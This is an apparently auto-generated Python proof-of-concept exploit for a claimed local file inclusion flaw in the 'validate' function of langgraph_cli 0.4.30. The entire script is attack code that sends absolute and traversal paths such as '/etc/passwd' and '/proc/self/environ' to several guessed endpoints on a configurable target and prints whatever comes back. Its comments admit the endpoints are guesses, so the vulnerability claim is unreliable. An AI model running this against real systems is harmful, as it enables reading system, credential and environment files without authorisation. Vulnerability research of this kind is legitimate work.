#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: lfi-000
# Sink: validate
# Auto-generated — run with: python3 lfi_supply_absolute_validate.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_cli-0.4.30
Vulnerability: The `validate` function opens a file at a user-supplied path without sanitization.
An attacker can read arbitrary files by providing an absolute path or path traversal sequences.
"""

import requests
import sys
import os

# Configuration
TARGET_URL = "http://localhost:8000"  # Change this to the target server
TIMEOUT = 10

def exploit_lfi(target_url, file_path):
    """
    Attempt to read an arbitrary file via the LFI vulnerability.
    
    Args:
        target_url: Base URL of the vulnerable service
        file_path: Path to the file to read (e.g., '/etc/passwd' or '../../etc/passwd')
    """
    # The vulnerable endpoint is likely something like /validate or similar
    # Based on the code, the validate function is a CLI command, but if exposed via API
    # it might be at /api/validate or similar. We'll try common patterns.
    
    endpoints = [
        "/validate",
        "/api/validate",
        "/cli/validate",
        "/config/validate",
    ]
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        print(f"[*] Trying endpoint: {url}")
        
        try:
            # Send the file path as the 'config' parameter
            response = requests.post(
                url,
                json={"config": file_path},
                timeout=TIMEOUT
            )
            
            if response.status_code == 200:
                print(f"[+] Success! Response from {url}:")
                print(response.text[:2000])  # Print first 2000 chars
                return True
            elif response.status_code == 400:
                print(f"[-] Bad request (400) - might need different parameter format")
            elif response.status_code == 404:
                print(f"[-] Endpoint not found (404)")
            elif response.status_code == 500:
                print(f"[-] Server error (500) - might have triggered but failed")
            else:
                print(f"[-] Unexpected status code: {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error - is the server running at {target_url}?")
        except requests.exceptions.Timeout:
            print(f"[-] Request timed out")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

def main():
    print("=" * 60)
    print("LFI Exploit PoC for langgraph_cli-0.4.30")
    print("=" * 60)
    print()
    
    # Test with a benign file first
    print("[*] Attempting to read /etc/passwd (common Linux file)")
    print("[*] This is a safe test - no modifications will be made")
    print()
    
    # Try multiple file paths to demonstrate the vulnerability
    test_paths = [
        "/etc/passwd",           # Absolute path
        "../../etc/passwd",      # Path traversal
        "/etc/hostname",         # Another safe file
        "/proc/self/environ",    # Environment variables (may contain sensitive info)
    ]
    
    for path in test_paths:
        print(f"\n[*] Testing with path: {path}")
        if exploit_lfi(TARGET_URL, path):
            print(f"\n[!] Vulnerability confirmed! File read successful.")
            break
        print()
    
    print("\n[*] Exploit attempt complete.")
    print("[*] If no files were read, the server might not be running or the endpoint might differ.")
    print("[*] Try adjusting TARGET_URL or check if the service exposes the validate function via API.")

if __name__ == "__main__":
    main()
